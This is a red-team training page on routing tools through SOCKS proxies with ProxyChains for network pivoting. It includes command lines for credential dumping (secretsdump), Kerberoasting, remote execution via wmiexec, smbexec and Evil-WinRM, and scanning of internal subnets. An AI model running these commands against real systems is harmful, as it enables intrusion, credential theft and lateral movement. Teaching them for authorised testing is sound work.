---
layout: training-page
title: "ProxyChains & SOCKS Proxy Routing — Red Team Academy"
module: "Pivoting & Tunneling"
tags:
  - proxychains
  - socks5
  - socks4
  - proxy-routing
page_key: "pivoting-proxychains"
render_with_liquid: false
---

# ProxyChains & SOCKS Proxy Routing

## Overview

ProxyChains forces any TCP connection from any tool through one or more SOCKS or HTTP proxies. It works by intercepting network calls using a shared library preloaded via `LD_PRELOAD` — meaning it requires no changes to the tools themselves. Set up a SOCKS proxy (via SSH -D, Chisel, Metasploit, or any other method), configure proxychains, and your entire toolset routes through the pivot.

```bash
# Install:
sudo apt install proxychains4

# Configuration file (edit before use):
/etc/proxychains4.conf

# Basic invocation:
proxychains <command> [args]
proxychains4 <command> [args]   # explicit version 4
```

## Configuration

The proxychains configuration file controls proxy chaining mode, DNS handling, and the proxy list.

```
# /etc/proxychains4.conf

# Chain modes (uncomment exactly ONE):
strict_chain          # all proxies in order — fail if any are down
#dynamic_chain        # skip dead proxies, use remaining in order
#random_chain         # randomize proxy order on each connection
#round_robin_chain    # cycle through proxies round-robin

# DNS — ALWAYS enable this to prevent DNS leaks:
proxy_dns

# Timeout settings:
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
# Format: type  host  port  [user  pass]
socks5  127.0.0.1 9050    # SSH -D tunnel or MSF socks_proxy
socks5  127.0.0.1 1080    # Chisel SOCKS5 or ligolo local
socks4  127.0.0.1 9050    # rpivot (SOCKS4 only)
http    127.0.0.1 8080    # HTTP CONNECT proxy
```

## Using proxychains with Common Tools

```bash
# ── Network Scanning ──────────────────────────────────────────
# Nmap through proxy — must use -sT (TCP connect), not SYN scan
# -Pn: skip host discovery (ICMP doesn't tunnel through SOCKS)
proxychains nmap -sT -Pn -p 22,80,443,445,3389,5985 172.16.5.0/24

# Faster scan — reduce threads to avoid overwhelming the proxy:
proxychains nmap -sT -Pn --open -p 80,443,445,3389,5985 172.16.5.0/24 --min-rate 100

# ── SMB / Active Directory ────────────────────────────────────
# CrackMapExec — SMB enumeration:
proxychains crackmapexec smb 172.16.5.0/24
proxychains crackmapexec smb 172.16.5.19 -u Administrator -p 'Password123!' --shares

# CrackMapExec — WinRM:
proxychains crackmapexec winrm 172.16.5.19 -u Administrator -p 'Password123!'

# Evil-WinRM:
proxychains evil-winrm -i 172.16.5.19 -u Administrator -p 'Password123!'

# ── Impacket Tools ────────────────────────────────────────────
# secretsdump:
proxychains python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
    domain/Administrator:'Password123!'@172.16.5.19

# wmiexec:
proxychains python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
    domain/Administrator:'Password123!'@172.16.5.19

# smbexec:
proxychains impacket-smbexec CORP/Administrator:'Password123!'@172.16.5.19

# GetUserSPNs (Kerberoasting):
proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
    CORP/user:'pass'@172.16.5.19 -dc-ip 172.16.5.19 -request

# ── Web Requests ──────────────────────────────────────────────
# curl through proxy:
proxychains curl http://172.16.5.100/
proxychains curl -k https://172.16.5.100/

# wget:
proxychains wget http://172.16.5.100/file.txt

# ── SSH ───────────────────────────────────────────────────────
# SSH through SOCKS proxy:
proxychains ssh user@172.16.5.19

# ── Metasploit ────────────────────────────────────────────────
proxychains msfconsole
# Inside MSF — also configure the proxy setting explicitly:
# setg Proxies socks5:127.0.0.1:9050
# This ensures payloads and modules use the proxy

# ── RDP ───────────────────────────────────────────────────────
proxychains xfreerdp /v:172.16.5.19 /u:Administrator /p:'Password123!'
```

## SOCKS Proxy Setup Methods

ProxyChains is the routing layer — it needs an underlying SOCKS proxy to route through. Multiple options exist.

```bash
# Method 1: SSH dynamic forwarding (-D)
ssh -D 9050 ubuntu@10.129.202.64 -N -f
# Creates SOCKS5 at 127.0.0.1:9050
# /etc/proxychains4.conf: socks5 127.0.0.1 9050

# Method 2: Chisel SOCKS server
# Attack box:
./chisel server -v -p 1234 --socks5
# Pivot:
./chisel client 10.10.14.5:1234 socks
# Creates SOCKS5 at 127.0.0.1:1080
# /etc/proxychains4.conf: socks5 127.0.0.1 1080

# Method 3: Metasploit auxiliary/server/socks_proxy
# After autoroute is configured:
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(socks_proxy) > set SRVPORT 9050
msf6 auxiliary(socks_proxy) > set VERSION 5
msf6 auxiliary(socks_proxy) > run -j
# Creates SOCKS5 at 127.0.0.1:9050

# Method 4: rpivot (SOCKS4)
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
# Creates SOCKS4 at 127.0.0.1:9050
# /etc/proxychains4.conf: socks4 127.0.0.1 9050

# Method 5: Ligolo-ng (does NOT need proxychains)
# Ligolo uses TUN routing — all tools work natively
# No proxychains configuration needed
```

## Chaining Multiple Proxies

ProxyChains can route through multiple proxies in sequence — useful for multi-hop pivoting where each hop adds a SOCKS proxy.

```
# /etc/proxychains4.conf — double pivot:
strict_chain
proxy_dns

[ProxyList]
socks5  127.0.0.1 9050   # first hop: SSH -D to Pivot1 (reaches Pivot1's network)
socks5  127.0.0.1 9051   # second hop: Chisel SOCKS via Pivot2 (reaches Pivot2's network)

# Traffic flow:
# Tool → proxychains → SOCKS5:9050 (Pivot1) → SOCKS5:9051 (Pivot2) → Target

# Setup for above:
# Hop 1: SSH -D 9050 on Pivot1
ssh -D 9050 ubuntu@pivot1 -N -f

# Hop 2: Second Chisel server on Pivot1, connected from attack box through hop 1:
proxychains ./chisel client pivot2:2345 socks --socks5 --port 9051
# Opens :9051 for second hop
```

## Per-Run Configuration Override

Use custom config files when you need different proxy settings for different operations simultaneously.

```bash
# Create separate config files:
cat > /tmp/proxychains-pivot1.conf << 'EOF'
strict_chain
proxy_dns
[ProxyList]
socks5  127.0.0.1  9050
EOF

cat > /tmp/proxychains-pivot2.conf << 'EOF'
strict_chain
proxy_dns
[ProxyList]
socks5  127.0.0.1  9051
EOF

# Use custom config with -f flag:
proxychains -f /tmp/proxychains-pivot1.conf nmap -sT 172.16.5.0/24
proxychains -f /tmp/proxychains-pivot2.conf crackmapexec smb 192.168.10.0/24

# Quiet mode (suppress proxychains output — cleaner tool output):
proxychains -q nmap -sT -Pn -p 445 172.16.5.0/24

# Verbose mode (debug proxy routing issues):
proxychains -v curl http://172.16.5.100
```

## proxychains Limitations

```
# Limitation 1: TCP only
# ICMP (ping) and UDP do not route through SOCKS proxies
# workaround: use TCP-based alternatives
#   nmap -sT instead of -sS
#   no ping — use nmap -Pn or TCP port check to verify host is up

# Limitation 2: SYN scan won't work
# nmap -sS requires raw sockets — use -sT (full connect) through proxychains
# Always add -Pn to skip ICMP host discovery

# Limitation 3: Some tools bypass proxychains
# Programs that use raw sockets, statically linked binaries, or Go net libraries
# may bypass LD_PRELOAD entirely
# Test first: proxychains curl http://example.com
# If it works, the tool respects proxychains; if not, it bypasses it

# Limitation 4: DNS leaks
# Without proxy_dns, DNS queries go to your local resolver (leaks your location)
# Always have proxy_dns set in config for operational use

# Limitation 5: Authentication
# SOCKS5 supports username/password auth; add to config:
# socks5  127.0.0.1  1080  username  password
# SOCKS4 does not support authentication
```

## Alternatives to proxychains

```bash
# tsocks — library preload approach, older alternative:
sudo apt install tsocks
# /etc/tsocks.conf: server = 127.0.0.1, server_port = 9050
tsocks curl http://172.16.5.100

# redsocks — transparent proxy redirect using iptables:
sudo apt install redsocks
# Redirect all traffic to SOCKS proxy via iptables OUTPUT rules
# Better for system-wide routing than per-tool

# graftcp — intercepts Go programs (which often bypass proxychains):
# Go binaries use their own net stack — proxychains LD_PRELOAD doesn't catch them
# graftcp uses ptrace to intercept syscalls:
go get github.com/hmgle/graftcp/cmd/graftcp
graftcp --socks5 127.0.0.1:9050 ./go-tool targets

# proxychains4 vs proxychains (older version):
# proxychains4 has better SOCKS5 support, proxy_dns, and IPv6
# Use proxychains4 when available (default on modern Kali/Parrot)
proxychains4 -version

# socat as a poor-man's single-hop proxy (no chaining):
socat TCP-LISTEN:8080,fork SOCKS5:127.0.0.1:172.16.5.19:80,socksport=9050
# Forwards local :8080 to 172.16.5.19:80 through SOCKS5 at :9050
```

## Quick Troubleshooting

```bash
# Test that the SOCKS proxy is actually listening:
ss -tlnp | grep 9050
nc -zv 127.0.0.1 9050

# Test proxychains works end-to-end:
proxychains curl http://172.16.5.100
# If it hangs: proxy may not be up, or target is unreachable from pivot
# If "connection refused": proxy is running but target port is closed

# Check proxychains is loading (verbose):
proxychains -v ls 2>&1 | head
# Should show: "ProxyChains-3.1 (http://proxychains.sf.net)"

# Check which proxychains binary/config is in use:
which proxychains
proxychains --help 2>&1 | head -3
cat /etc/proxychains4.conf | grep -v "^#" | grep -v "^$"

# If nmap returns no results through proxychains:
# 1. Make sure -Pn is set (skip ping)
# 2. Make sure -sT is set (TCP connect, not SYN)
# 3. Reduce threads/rate to not overwhelm proxy
proxychains nmap -sT -Pn --open -p 80,443,445 172.16.5.19 -v
```

## Resources

- proxychains-ng — https://github.com/rofl0r/proxychains-ng
- redsocks — https://github.com/darkk/redsocks
- graftcp — https://github.com/hmgle/graftcp
- MITRE T1090 — Proxy
- MITRE T1572 — Protocol Tunneling
